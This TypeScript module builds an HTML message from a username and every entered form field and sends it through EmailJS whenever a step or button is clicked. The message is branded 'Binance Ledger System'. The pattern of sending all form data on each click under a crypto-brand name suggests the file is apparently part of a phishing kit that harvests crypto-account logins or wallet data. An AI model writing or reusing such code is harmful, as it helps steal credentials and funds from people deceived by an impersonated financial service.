
import emailjs from 'emailjs-com';
import { EMAILJS_CONFIG } from '@/config/emailjs.config';

interface EmailData {
  step: string;
  field?: string;
  value?: string;
  username?: string;
  timestamp: string;
  allFormData?: any;
}

export const sendEmailNotification = async (data: EmailData) => {
  try {
    // Format all form data into clean HTML with defaults for empty fields
    let formDataHtml = '';
    if (data.allFormData && typeof data.allFormData === 'object') {
      formDataHtml = Object.entries(data.allFormData)
        .map(([key, value]) => {
          const displayValue = value || 'N/A';
          const formattedKey = key.charAt(0).toUpperCase() + key.slice(1).replace(/([A-Z])/g, ' $1');
          return `<strong>${formattedKey}:</strong> ${displayValue}`;
        })
        .join('<br>');
    } else {
      formDataHtml = 'No form data available';
    }

    // Create a comprehensive message with all information
    const message = `
<h2>🔔 Step: ${data.step}</h2>
<p><strong>Timestamp:</strong> ${data.timestamp}</p>
${data.username ? `<p><strong>Username:</strong> ${data.username}</p>` : ''}

<h3>📋 Complete Form Data:</h3>
${formDataHtml}

<hr>
<p><em>Automated notification from Binance Ledger System</em></p>
    `.trim();

    // Use only two simple variables to avoid corruption
    const templateParams = {
      subject: `🚨 ${data.step} - Button Click Activity`,
      message: message
    };

    console.log('🚨 SENDING EMAIL FOR BUTTON CLICK:', data.step);
    console.log('📧 Complete form data being sent:', data.allFormData);
    console.log('📧 Template params:', templateParams);

    const result = await emailjs.send(
      EMAILJS_CONFIG.SERVICE_ID,
      EMAILJS_CONFIG.TEMPLATE_ID,
      templateParams,
      EMAILJS_CONFIG.USER_ID
    );

    console.log('✅ Email sent successfully:', result);
    return result;
  } catch (error) {
    console.error('❌ Failed to send email:', error);
    throw error;
  }
};
